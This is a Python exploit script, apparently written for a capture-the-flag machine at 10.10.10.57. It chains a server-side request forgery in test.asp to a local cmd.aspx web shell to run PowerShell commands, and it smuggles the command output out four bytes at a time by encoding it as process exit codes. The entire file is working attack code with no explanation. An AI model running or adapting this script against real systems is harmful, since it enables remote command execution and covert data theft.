import requests
import sys
import urllib2

'''
Command Creation
'''
def get_cmd_length(command):
    cmd =  '$command = (Invoke-Command -ScriptBlock {{{0}}} | Out-String).TrimStart().TrimEnd(); $command | Out-File $env:temp/merror.txt -encoding ASCII ;exit $command.length'.format(command)
    return cmd

def error_exfil(command, output_length):
    output_length = int(output_length)
    for start in range(0, int(output_length), 4):
        if (output_length - start) < 4:
            amount_to_fetch = output_length-start
        else:
            amount_to_fetch = "4"
        run_cmd = '$fs = Get-Content $env:temp/merror.txt -Encoding Byte -ReadCount 0; $bytearray = $fs[{0}..{1}]; $hex = [System.BitConverter]::ToString($bytearray) -replace \'-\',\'\';\
echo $hex; exit ([convert]::ToInt32($hex, 16));'.format(start, int(start)+int(amount_to_fetch)-1)
        yield run_cmd

def decode_error(errorval):
    val = hex(int(errorval))[2:]
    if len(val)%2 !=0:
        val = '0'+ val

    return val.decode('hex')

'''
Command Sending and Receiving
'''

def run_on_minion(command):
    
    url = 'http://10.10.10.57:62696' 
    base_url = "/test.asp?u=http://127.0.0.1:80/cmd.aspx?xcmd=" 
    pshell = "powershell -Command \"{0}\"".format(command)
    req = requests.get(url+base_url+urllib2.quote(pshell)) 
    #TODO filter this properly 
    result = req.text 
    error_code = [x.split('=')[1] for x in result.split('\n') if "Exit Status" in x][0]
    return error_code 

'''
Main Loop
'''

def main():
    while True:
        cmd = raw_input('PS>')
        len_cmd = get_cmd_length(cmd)
        length_of_command = run_on_minion(len_cmd)
        for torun in error_exfil(cmd, length_of_command):
            errorval = run_on_minion(torun)
            decodedval = decode_error(errorval)
            sys.stdout.write(decodedval)
            sys.stdout.flush()
        sys.stdout.write('\n')
        sys.stdout.flush()


if __name__ == '__main__':
    main()
